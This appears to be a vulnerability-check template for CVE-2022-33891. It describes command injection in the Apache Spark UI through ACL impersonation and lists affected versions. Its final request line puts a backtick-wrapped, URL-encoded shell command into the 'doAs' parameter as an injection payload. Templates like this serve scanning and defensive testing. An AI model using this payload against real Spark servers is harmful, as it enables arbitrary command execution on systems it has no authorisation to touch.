id: CVE-2022-33891
info:
  classification: CVE-2022-33891
  description: 'Apache Spark UI is susceptible to remote command injection. ACLs can
    be enabled via the configuration option spark.acls.enable. With an authentication
    filter, this checks whether a user has access permissions to view or modify the
    application. If ACLs are enabled, a code path in HttpSecurityFilter can allow
    impersonation by providing an arbitrary user name. An attacker can potentially
    reach a permission check function that will ultimately build a Unix shell command
    based on input and execute it, resulting in arbitrary shell command execution.
    Affected versions are 3.0.3 and earlier, 3.1.1 to 3.1.2, and 3.2.0 to 3.2.1.

    '
  name: CVE-2022-33891
  severity: high
request:
  url:
  - match: /?doAs=`{{url_encode("{{command}}")}}`
